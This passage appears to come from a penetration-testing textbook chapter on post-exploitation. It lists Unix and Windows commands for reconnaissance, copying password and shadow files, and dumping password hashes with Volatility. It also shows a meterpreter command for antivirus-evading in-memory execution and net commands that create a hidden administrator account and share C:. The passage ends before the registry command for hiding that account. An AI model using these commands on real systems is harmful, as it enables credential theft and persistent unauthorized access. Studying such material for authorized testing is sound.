If the compromised system is based on the Unix platform, typical local
reconnaissance commands will include the following:
Command Description
/etc/resolv.conf Use the copy command to access and review the
system's current DNS settings. Because it is a global
file with read privileges, it will not trigger alarms
when accessed.
/etc/passwd and /etc/shadow These are system files that contains username and
password hashes. It can be copied by a person with
root-level access, and the passwords can be broken
using a tool such as John the Ripper.
whoami and who -a Identify the users on a local system.
ifconfig -a, iptables -L -n, Provide networking information. ifconfig -a
and netstat -r provides IP addressing details, iptables -L -n
lists all of the rules held in the local firewall (if
present), and netstat -r displays the routing
information maintained by the kernel.
uname -a Prints the kernel version.
ps aux Prints currently running services, the process ID,
and additional information.
dpkg -l yum list | grep Identify the installed software packages.
installed and dpkg -l rpm
-qa --last | head
These commands contain a brief synopsis of the available options. Refer to the
appropriate command's help file for complete information on how it can be used.
For a Windows system, the following commands will be entered:
Command Description
whoami /all Lists the current user, SID, user privileges,
and groups.

Using the WMIC scripting language
On newer systems, attackers and penetration testers take advantage of built-in
scripting languages, for example, Windows Management Instrumentation
Command-line (WMIC), a command-line and scripting interface that is used
to simplify access to Windows Instrumentation. If the compromised system
supports WMIC, several commands can be used to gather information. Refer to
the following table:
Command Description
wmic nicconfig get Obtains the IP address and MAC address
ipaddress,macaddress
wmic computersystem get Verifies the account that was compromised

PowerShell is a scripting language built on the .NET Framework that runs from a
console, giving the user access to the Windows filesystem and objects such as the
registry. It is installed by default on the Windows 7 operating system and higher
versions. PowerShell extends the scripting support and automation offered by
WMIC by permitting the use of shell integration and interoperability on both local
and remote targets.
PowerShell gives testers access to a shell and scripting language on a compromised
system. Since it is native to the Windows operating system, its use of the commands
does not trigger the antivirus software. When scripts are run on a remote system,
PowerShell does not write to the disk, bypassing the antivirus and whitelisting the
controls (assuming that the user has permitted the use of PowerShell).
PowerShell supports a number of built-in functions that are referred to as cmdlets.
One of the advantages of PowerShell is that cmdlets are aliased to common Unix
commands, so entering the ls command will return a typical directory listing, as
shown in the following screenshot:
[ 126 ]
Chapter 5
PowerShell is a rich language capable of supporting very complex operations; it is
recommended that the user spend the time to become familiar with its use. Some of
the simpler commands that can be used immediately following a compromise are
described in the following table:
Command Description
Get-Host | Select Version Identifies the version of PowerShell used
by the victim's system. Some cmdlets are
added or invoked in different versions.
Get-Hotfix Identifies the installed security patches
and system hotfixes.
Get-Acl Identifies the group names and usernames.
Get-Process, Get-Service Lists the current processes and services.
gwmi win32_useraccount Invokes WMI to list the user accounts.
Gwmi_win32_group Invokes WMI to list the SIDs, names,
and domain groups.
Penetration testers can use Windows native commands, DLLs, .NET functions,
WMI calls, and PowerShell cmdlets together to create PowerShell scripts with the
extension .ps1.
During a recent penetration test, we were prohibited from
installing any executable software on the client's systems. We
used a PowerShell keylogger on a compromised system to grab
administrator-level credentials and then compromised most of the
systems on the network. The most effective exploit and post-exploit
scripts, including the keylogger, are part of Nikhil Mittal's Nishang
package (https://code.google.com/p/nishang/downloads/
detail?name=nishang_0.3.0.zip).
Reconnaissance should also extend to the local network. Since you are working
"blind," you will need to create a map of live systems and subnets that the
compromised host can communicate with. Start by entering IFCONFIG (Unix-based
systems) or IPCONFIG /ALL (Windows systems) in the shell prompt. This will allow
an attacker to determine the following:
• Whether DHCP addressing is enabled.
• The local IP address, which will also identify at least one active subnet.
[ 127 ]
Post Exploit – Action on the Objective
• The gateway IP address and DNS server address. System administrators
usually follow a numbering convention across the network, and if an
attacker knows one address, such as a gateway server 172.16.21.5, they
will ping addresses such as 172.16.20.5, 172.16.22.5, and so on to find
additional subnets.
• The domain name used to leverage Active Directory accounts.
If the attacking system and the target system are using Windows, the net view
command can be used to enumerate other Windows systems on the network.
Attackers use the netstat -rn command to review the routing table, which may
contain static routes to networks or systems of interest.
The local network can be scanned using nmap to sniff for ARP broadcasts. In
addition, Kali has several tools that can be used for an SNMP endpoint analysis,
including nmap, onesixtyone, and snmpcheck.
Deploying a packet sniffer to map traffic will help you identify hostnames, active
subnets, and domain names. If DHCP addressing is not enabled, it will also allow
attackers to identify any unused, static IP addresses. Kali is preconfigured with
Wireshark (a GUI-based packet sniffer) but you can also use tshark in a post-
exploitation script or from the command line, as shown in the following screenshot:
[ 128 ]
Chapter 5
Finding and taking sensitive
data – pillaging the target
The term pillaging (sometimes known as pilfering) is a holdover from the days when
hackers who had successfully compromised a system saw themselves as pirates racing
to their target to steal or damage as much data as possible. The terms have survived as
a reference to the much more careful practice of stealing or modifying proprietary or
financial data when the objective of the exploit has been achieved.
The attacker can then focus on the secondary target—system files that will provide
information to support additional attacks. The choice of the secondary files will
depend on the operating system of the target. For example, if the compromised
system is Unix, then the attacker will also target the following:
• The system and configuration files (usually in the /etc directory, but
depending on the implementation, they may be in /usr/local/etc or
other locations)
• The password files (/etc/password and /etc/shadow)
• The configuration files and public/private keys in the .ssh directory
• The public and private key rings that may be contained in the
.gnupg directory
• The e-mail and data files
In a Windows system, the attacker will target the following:
• The system memory, which can be used to extract passwords, encryption
keys, and so on
• The system registry files
• The Security Accounts Manager (SAM) database that contains hashed
versions of the password, or alternative versions of the SAM database which
may be found in %SYSTEMROOT%\repair\SAM and %SYSTEMROOT%\System32\
config\RegBack\SAM
• Any other password or seed files used for encryption
• The e-mail and data files
Don't forget to review folders that contain temporary items, such
as attachments. For example, UserProfile\AppData\Local\
Microsoft\Windows\Temporary Internet Files\ may
contain files, images, and cookies that may be of interest.
[ 129 ]
Post Exploit – Action on the Objective
As stated, the system memory contains a significant amount of information for any
attacker. Therefore, it is usually a priority file that you need to obtain. The system
memory can be downloaded as a single image file from several sources as follows:
• By uploading a tool to the compromised system and then directly
copying the memory (the tools include Belkasoft RAM capturer,
MandiantMemoryze, and MonsolsDumpIt).
• By copying Windows hibernation file, hiberfil.sys and then using
Volatility to decrypt and analyze the file. Volatility, found on Kali in the
Forensics menu, is a framework that was written to analyze memory
dumps from the system RAM and other files containing system memory. It
relies on plugins written in Python to analyze the memory and extract data,
such as encryption keys, passwords, registry information, processes, and
connectivity information.
• By copying a virtual machine and converting the VMEM file to a
memory file.
If you upload a program designed to capture memory onto a compromised
system, it is possible that this particular application will be identified
as malicious software by an antivirus software. Most antivirus software
applications recognize the hash signature and behavior of memory
acquisition software, and act to protect the sensitive contents of the physical
memory by raising an alarm if it is at risk of disclosure. The acquisition
software will be quarantined, and the target will receive a warning alerting
them of the attack.
To avoid this, use Metasploit Framework to run the executable completely
in the target's memory using the following command:
meterpreter> execute -H -m -d calc.exe -f 
The previous command executes calc.exe as a dummy executable
but uploads the memory acquisition executable to run in its process
space instead.
The executable doesn't show up in process lists, such as Task Manager, and
detection using data forensic techniques is much harder because it's not
written to disk. Furthermore, it will avoid the system's antivirus software,
which generally does not scan the memory space in search of malware.
[ 130 ]
Chapter 5
Once the physical memory has been downloaded, it can be analyzed using Volatility
Framework, a collection of Python scripts designed to forensically analyze memory.
If the operating system is supported, Volatility will scan the memory file and extract
the following:
• The image information and system data sufficient to tie the image to its
source system.
• The running processes, loaded DLLs, threads, sockets, connections,
and modules.
• The open network sockets and connections, and recently opened
network connections.
• The memory address, including physical and virtual memory mapping.
• The LM/NTLM hashes and LSA secrets. LanMan (LM) password hashes
are Microsoft's original attempt at protecting passwords. Over the years, it
has become simple to break them and convert the hashes back into an actual
password. NT LanMan (NTLM) hashes are more recent and resilient to
attack. However, they are usually stored with the NTLM versions for the
purpose of backward compatibility. Local Security Authority (LSA) stores
"secrets" that are local passwords: remote access (wired or wireless), VPN,
autologon passwords, and so on. Any passwords stored on the system are
vulnerable, especially if the user reuses passwords.
• Specific regular expressions or strings stored in memory.
Using the sample image for a system infected with Zeus malware (https://code.
google.com/p/volatility/wiki/SampleMemoryImages), we'll use Volatility
Framework to extract the encrypted LanMan password hashes.
The first step is to determine the type of image and the operating system using the
following command:
root@kali:usr/share/volatility# python vol.py imageinfo -f
/root/Desktop/zeus.vmem
[ 131 ]
Post Exploit – Action on the Objective
The execution of the previous command is shown in the following screenshot:
The hivelist plugin will print out the initial virtual memory location for the various
registry hives when it is called using the following command:
root@kali:usr/share/volatility#python vol.py hivelist -f
/root/Desktop/zeus.vmem
The execution of the previous command is shown in the following screenshot:
In order to dump the hashes, the initial virtual memory locations of both the SAM and
SYSTEM hives are required. Using the following command the results are piped to a
comma-delimited file to be directly imported by a password-cracking application:
root@kali:usr/share/volatility#python vol.py hashdump -f
/root/Desktop/zeus.vmem -y 0xe101b008 -s 0xe1544008
>>/root/Desktop/hashdump.csv

The execution of the previous command is shown in the following screenshot:
The isolated LM hashes can be cracked using Hashcat, John the Ripper, Ophcrack,
and Rainbow Tables.
Creating additional accounts
The following commands are highly invasive and are usually detected by the system
owner during the incident response process. However, they are frequently planted
by an attacker to draw attention away from more persistent access mechanisms.
Refer to the following table:
Command Description
net user attacker password / Creates a new local account with a user called
add attacker with the password as password.
net localgroup administrators Adds the new user attacker to the local
attacker /add administrator's group. In some cases,
the command will be net localgroup
administrators /add attacker.
net user username /active:yes Changes an inactive or disabled account to
/domain active. In a small organization, this will attract
attention. Large enterprises with poor password
management can have 30 percent of their
passwords flagged as "inactive," so it may
be an effective way to gain an account.
net share name$=C:\ / Shares C: (or another specified drive) as a
grant:attacker,FULL / Windows share, and grants the user (attacker)
unlimited full rights to access or modify all of the content
on that drive.

If you create a new user account, it will be noticed when anyone logs onto the
welcome screen of the compromised system. To make the account invisible, you need
to modify the registry from the command line using the following REG command:
